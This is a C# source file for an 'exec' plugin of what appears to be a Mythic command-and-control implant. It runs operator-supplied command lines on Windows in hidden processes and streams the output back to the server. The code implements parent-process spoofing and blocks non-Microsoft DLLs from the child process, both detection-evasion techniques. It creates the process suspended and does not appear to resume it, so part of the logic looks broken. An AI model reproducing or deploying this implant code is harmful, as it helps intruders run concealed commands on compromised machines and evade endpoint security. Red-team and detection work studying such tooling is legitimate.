using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "exec";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);
            if (args is null || string.IsNullOrEmpty(args.commandLine))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Missing commandline",
                    completed = true
                });
                return;
            }

            if (args.parent > 0)
            {
                args.spoofParent = true;
            }

            SafeFileHandle shStdOutRead;
            SafeFileHandle shStdOutWrite;
            Native.PROCESS_INFORMATION pInfo;

            if (!TrySpawnProcess(args, out pInfo, out shStdOutRead, out shStdOutWrite))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Failed to spawn process",
                    completed = true
                });
                return;
            }

            if (args.output && !shStdOutRead.IsInvalid)
            {
                GetProcessOutput(shStdOutRead.DangerousGetHandle(), pInfo, job.task.id);
            }

            CleanUp(shStdOutRead, shStdOutWrite, pInfo);
        }
        private bool TrySpawnProcess(ExecArgs args, out Native.PROCESS_INFORMATION procInfo, out SafeFileHandle shStdOutRead, out SafeFileHandle shStdOutWrite)
        {
            SafeFileHandle tempWrite = new SafeFileHandle();
            SafeFileHandle tempRead = new SafeFileHandle();
            SafeFileHandle dupStdOut = new SafeFileHandle();
            var pInfo = new Native.PROCESS_INFORMATION();
            var siEx = new Native.STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            var saHandles = new Native.SECURITY_ATTRIBUTES()
            {
                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero

            };

            if (args.output)
            {
                if (!TryCreateNamedPipe(ref saHandles, out tempRead, out tempWrite))
                {
                    procInfo = pInfo;
                    shStdOutRead = tempRead;
                    shStdOutWrite = tempWrite;
                    return false;
                }
                siEx.StartupInfo.hStdError = tempWrite.DangerousGetHandle();
                siEx.StartupInfo.hStdOutput = tempWrite.DangerousGetHandle();
            }

            var lpSize = IntPtr.Zero;

            if (!Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize))
            {
                procInfo = pInfo;
                shStdOutRead = tempRead;
                shStdOutWrite = tempWrite;
                return false;
            }

            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            IntPtr lpValueProc = IntPtr.Zero;

            if (!Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize))
            {
                procInfo = pInfo;
                shStdOutRead = tempRead;
                shStdOutWrite = tempWrite;
                return false;
            }

            if (args.blockDlls)
            {
                AddBlockDLLs(ref siEx, ref lpSize);
            }

            if (args.spoofParent)
            {
                AddSpoofParent(args.parent, ref siEx, ref lpValueProc, ref tempWrite, ref dupStdOut);
            }

            siEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = Native.SW_HIDE;

            var ps = new Native.SECURITY_ATTRIBUTES();
            var ts = new Native.SECURITY_ATTRIBUTES();

            ps.nLength = Marshal.SizeOf(ps);
            ts.nLength = Marshal.SizeOf(ts);

            shStdOutRead = tempRead;
            shStdOutWrite = tempWrite;
            bool success = Native.CreateProcess(null, args.commandLine, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out procInfo);

            //Clean up our lpAttributeList
            if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
            {
                Native.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                Marshal.FreeHGlobal(siEx.lpAttributeList);
            }

            return success;

        }
        private bool TryCreateNamedPipe(ref Native.SECURITY_ATTRIBUTES saHandles, out SafeFileHandle shStdOutRead, out SafeFileHandle shStdOutWrite)
        {
            if (!Native.CreatePipe(out shStdOutRead, out shStdOutWrite, ref saHandles, 0))
            {
                return false;
            }

            if (!Native.SetHandleInformation(shStdOutRead.DangerousGetHandle(), Native.HANDLE_FLAGS.INHERIT, 0))
            {
                return false;
            }

            return true;
        }
        private bool AddBlockDLLs(ref Native.STARTUPINFOEX siEx, ref IntPtr lpSize)
        {
            //Initializes the specified list of attributes for process and thread creation.

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, Native.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            // Add Microsoft-only DLL protection to our StartupInfoEx struct
            return Native.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                lpMitigationPolicy,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
        }
        private bool AddSpoofParent(int parentProcessId, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref SafeFileHandle hStdOutWrite, ref SafeFileHandle hDupStdOutWrite)
        {
            //Get a handle to the parent process
            IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);

            // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

            Marshal.WriteIntPtr(lpValueProc, parentHandle);

            //Updates the parent process ID
            bool success = Native.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValueProc,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (!success)
            {
                return false;
            }

            IntPtr hCurrent = Process.GetCurrentProcess().Handle;
            IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
            IntPtr tempDuphandle = IntPtr.Zero;
            if (!Native.DuplicateHandle(hCurrent, hStdOutWrite.DangerousGetHandle(), hNewParent, ref tempDuphandle, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS))
            {
                return false;
            }

            //The old handle would get overwritten if we're process spoofing, so we apply our backup handle here
            siEx.StartupInfo.hStdError = tempDuphandle;
            siEx.StartupInfo.hStdOutput = tempDuphandle;

            return true;
        }
        private bool GetProcessOutput(IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, string task_id)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            CancellationToken ct = cts.Token;
            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);

            while (!ct.IsCancellationRequested) //Loop to handle process output
            {
                if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
                {
                    cts.Cancel();
                }

                char[] buf;
                int bytesRead;
                uint bytesToRead = 0;

                if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
                {
                    if (bytesToRead == 0) //We don't have any bytes to read
                    {
                        if (ct.IsCancellationRequested) //Check if we're supposed to exit
                        {
                            messageManager.WriteLine("Finished.", task_id, true);
                            break;
                        }
                        else //Process just hasn't written anything yet
                        {
                            continue;
                        }
                    }
                    else if (bytesToRead > 4096) //We limit our buffer size to 4096 to not overwhelm the agent
                    {
                        bytesToRead = 4096;
                    }

                    buf = new char[bytesToRead]; //Allocate our new char buffer

                    try
                    {
                        bytesRead = reader.Read(buf, 0, buf.Length); //Read the char buffer into our previously allocated array

                        if (bytesRead > 0) //We read some bytes, lets return it to Mythic
                        {
                            messageManager.Write(new string(buf), task_id, false);
                        }
                    }
                    catch
                    {
                        //nadda
                    }
                }
            }

            reader.Close();

            return true;
        }
        private void CleanUp(SafeFileHandle hStdOutRead, SafeFileHandle hStdOutWrite, Native.PROCESS_INFORMATION pInfo)
        {

            hStdOutRead.Dispose();
            hStdOutWrite.Dispose();

            if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
            {
                //Native.TerminateProcess(pInfo.hProcess, 0);
                Native.CloseHandle(pInfo.hProcess);
            }

            if (pInfo.hThread != IntPtr.Zero)
            {
                Native.CloseHandle(pInfo.hThread);
            }
        }
    }
}
